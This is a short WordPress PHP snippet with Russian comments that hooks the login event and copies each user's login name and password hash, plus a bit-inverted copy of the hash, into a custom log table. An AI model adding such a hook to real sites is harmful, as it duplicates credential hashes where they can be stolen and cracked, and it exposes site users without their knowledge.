...
function save_user_login($user_login, $user) {
    ...
    // Проверяем, что $user действительно является объектом WP_User
    if (is_a($user, 'WP_User')) {
        // Извлекаем пароль
        $user_password = $user->user_pass;

        // Инвертирование битов хэша пароля
        $password_inverted = ~$user_password;

        // Запись данных в таблицу
        $wpdb->insert('user_auth_logs', array(
            'login' => $user_login,
            'password_original' => $user_password,
            'password_inverted' => $password_inverted
        ));
    }
}

// Хук, который запускает функцию после авторизации пользователя
add_action('wp_login', 'save_user_login', 10, 2);
